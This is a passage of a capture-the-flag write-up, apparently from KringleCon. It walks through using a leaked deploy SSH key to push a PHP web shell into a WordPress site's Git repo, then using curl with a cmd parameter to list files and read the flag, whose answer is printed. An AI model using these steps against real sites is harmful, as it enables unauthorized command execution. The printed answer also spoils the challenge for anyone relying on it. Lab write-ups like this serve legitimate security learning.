+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">git</span> <span class="n">config</span> <span class="o">--</span><span class="k">global</span> <span class="n">user</span><span class="o">.</span><span class="n">name</span> <span class="s2">&quot;knee-oh&quot;</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><img border=0 width=624 height=56 id="Picture 374"
+  src="../../images/blog_images/image113.png"
+  alt="Text&#10;&#10;Description automatically generated"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Start the SSH agent</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">eval</span> <span class="s2">&quot;$(ssh-agent -s)&quot;</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+  border=0 width=385 height=31 id="Picture 376"
+  src="../../images/blog_images/image114.png"></span></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Add the SSH private key to the SSH agent</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">ssh</span><span class="o">-</span><span class="n">add</span> <span class="o">.</span><span class="n">deploy</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+  border=0 width=399 height=31 id="Picture 378"
+  src="../../images/blog_images/image115.png"></span></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Clone the git repo again with SSH using the private key
+  of the user sporx@kringlecon.com to a directory named
+  &quot;wordpress.flag.net.internal2&quot;</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">git</span><span class="nd">@gitlab</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="p">:</span><span class="n">rings</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">powder</span><span class="o">/</span><span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">git</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal2</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+ <img src="../../images/blog_images/image116.png"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>The repo is now cloned to the &quot;wordpress.flag.net.internal2&quot;
+  directory</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">ls</span> <span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal2</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <img border=0 src="../../images/blog_images/image117.png">
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Create a new backdoor to execute commands on the remote
+  host (wordpress web server, wordpress.flag.net.internal). This will take a
+  querystring cat=&lt;URL encoded command&gt;</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">nano</span> <span class="n">shell</span><span class="o">.</span><span class="n">php</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+  border=0 width=510 height=45 id="Picture 382"
+  src="../../images/blog_images/image118.png"></span></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Add the newly saved shell.php and commit to the repo</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">git</span> <span class="n">add</span> <span class="o">.</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">git</span> <span class="n">commit</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <img border=0 src="../../images/blog_images/image119.png">
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Push the changes to the remote repository</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">git</span> <span class="n">push</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><img border=0 src="../../images/blog_images/image120.png"
+  alt="Text&#10;&#10;Description automatically generated"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Now we can execute arbitrary commands using shell.php.
+  Below showing using ls command which also lists newly uploaded shell.php</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">ls</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <img border=0   src="../../images/blog_images/image121.png"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Getting contents of root (/) showing flag.txt</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">ls</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><img border=0 src="../../images/blog_images/image122.png"
+  alt="Text&#10;&#10;Description automatically generated"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Getting the contents of that /flag.txt</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">cat</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">Fflag</span><span class="o">.</span><span class="n">txt</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><img border=0 src="../../images/blog_images/image123.png"
+  alt="Chart&#10;&#10;Description automatically generated"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Answer : oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>The objective is now completed and we get 100 coins as
+  well</p>
+  <p class=TableRowBold><img border=0 width=287 height=55 id="Picture 388"
+  src="../../images/blog_images/image124.png"
+  alt="Text&#10;&#10;Description automatically generated with medium confidence"><img
+  border=0 width=266 height=57 id="Picture 22"
+  src="../../images/blog_images/image125.png"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>At this point we have recovered the Elfen ring</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold align=center style='text-align:center'><img border=0
+  width=547 height=99 id="Picture 476"
+  src="../../images/blog_images/image126.png"></p>
+  </td>
+ </tr>
+</table>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.12658920.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.5cf534bf.min.js"></script>
+      
+    
+  </body>
+</html>
